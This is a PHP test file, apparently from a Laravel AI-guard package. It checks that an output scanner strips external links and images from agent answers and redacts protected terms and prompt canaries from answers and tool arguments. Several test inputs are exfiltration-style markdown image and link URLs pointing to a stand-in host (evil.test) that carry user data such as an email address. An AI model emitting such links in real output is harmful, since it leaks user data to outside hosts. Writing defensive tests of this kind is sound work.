<?php

namespace ZeeshanElahi\AiGuard\Tests\Feature;

use Illuminate\Foundation\Testing\RefreshDatabase;
use Laravel\Ai\Responses\Data\ToolCall;
use ZeeshanElahi\AiGuard\Output\OutputScanner;
use ZeeshanElahi\AiGuard\RedTeam\Scenario;
use ZeeshanElahi\AiGuard\Tests\Fixtures\CreateSupportTicket;
use ZeeshanElahi\AiGuard\Tests\Fixtures\OutputAgent;
use ZeeshanElahi\AiGuard\Tests\TestCase;

class LinksAndTermsTest extends TestCase
{
	use RefreshDatabase;

	protected function links(string $text, array $allowed = []): array
	{
		config(['app.url' => 'https://shop.example.com', 'ai-guard.output.links.allowed_domains' => $allowed]);

		return (new OutputScanner)->redactLinks($text);
	}

	public function test_a_markdown_image_to_another_domain_is_removed(): void
	{
		[$text, $count] = $this->links('Done. ![status](https://evil.test/pixel?u=sara@example.com)');

		$this->assertSame('Done. ', $text);
		$this->assertSame(1, $count);
	}

	public function test_a_markdown_link_keeps_its_text_and_loses_the_url(): void
	{
		[$text] = $this->links('See [our policy](https://evil.test/steal?d=x) for details.');

		$this->assertSame('See our policy for details.', $text);
	}

	public function test_html_images_and_bare_urls_are_removed(): void
	{
		[$text, $count] = $this->links('A <img src="https://evil.test/a.png?x=1"> B https://evil.test/c?d=2 C');

		$this->assertSame('A  B [link removed] C', $text);
		$this->assertSame(2, $count);
	}

	public function test_protocol_relative_urls_count_as_external(): void
	{
		[$text] = $this->links('![x](//evil.test/p.gif)');

		$this->assertSame('', $text);
	}

	public function test_the_app_domain_subdomains_and_allowed_domains_are_kept(): void
	{
		$input = '[Track](https://shop.example.com/orders/1) ![logo](https://cdn.shop.example.com/l.png) https://docs.partner.test/returns';

		[$text, $count] = $this->links($input, ['partner.test']);

		$this->assertSame($input, $text);
		$this->assertSame(0, $count);
	}

	public function test_a_lookalike_domain_is_not_allowed(): void
	{
		[$text] = $this->links('https://shop.example.com.evil.test/x and https://evilshop.example.com/y');

		$this->assertSame('[link removed] and [link removed]', $text);
	}

	public function test_link_filtering_can_be_turned_off(): void
	{
		config(['ai-guard.output.links.enabled' => false]);

		[$text] = (new OutputScanner)->redactLinks('![x](https://evil.test/p)');

		$this->assertSame('![x](https://evil.test/p)', $text);
	}

	public function test_code_like_tokens_from_the_instructions_are_protected(): void
	{
		$scanner = new OutputScanner;
		$terms = $scanner->protectedTermsFor(Scenario::instructions());

		$this->assertContains(Scenario::INSTRUCTIONS_CANARY, $terms);
		$this->assertNotContains('Northwind', $terms);   // plain words are not codes
		$this->assertNotContains('50', $terms);          // too short, digits only

		[$text, $count] = $scanner->redactProtectedTerms('Our staff reference is prompt-canary-q7x2.', Scenario::instructions());

		$this->assertSame('Our staff reference is [redacted].', $text);
		$this->assertSame(1, $count);
	}

	public function test_configured_and_constructor_terms_are_protected(): void
	{
		config(['ai-guard.output.protected_terms' => ['Project Falcon'], 'ai-guard.output.protect_instruction_codes' => false]);

		$scanner = new OutputScanner([], ['wiki/managers']);

		[$text, $count] = $scanner->redactProtectedTerms('project falcon notes are in wiki/managers.', 'Codes like ZX-4471 are internal.');

		$this->assertSame('[redacted] notes are in [redacted].', $text);
		$this->assertSame(2, $count);
	}

	public function test_instruction_codes_can_be_turned_off(): void
	{
		config(['ai-guard.output.protect_instruction_codes' => false]);

		$this->assertSame([], (new OutputScanner)->protectedTermsFor('Ref ABC-1234-XYZ.'));
	}

	public function test_the_agent_answer_is_cleaned_end_to_end(): void
	{
		config(['app.url' => 'https://acme.test']);

		OutputAgent::fake(['Here you go ![t](https://evil.test/p?e=sara) and [returns](https://acme.test/returns).']);

		$response = (new OutputAgent)->prompt('Returns?');

		$this->assertSame('Here you go  and [returns](https://acme.test/returns).', $response->text);
		$this->assertDatabaseHas('ai_guard_events', ['rule' => 'external_link']);
	}

	public function test_protected_terms_are_removed_from_tool_arguments(): void
	{
		config(['ai-guard.output.protected_terms' => ['MGR-CODE-5521']]);
		CreateSupportTicket::$created = [];

		OutputAgent::fake([
			new ToolCall('c1', 'CreateSupportTicket', ['order_number' => 'ORD-10012', 'reason' => 'use MGR-CODE-5521']),
			'Done.',
		]);

		(new OutputAgent)->prompt('Open a ticket for ORD-10012.');

		$this->assertSame('use [redacted]', CreateSupportTicket::$created[0]['reason']);
	}
}
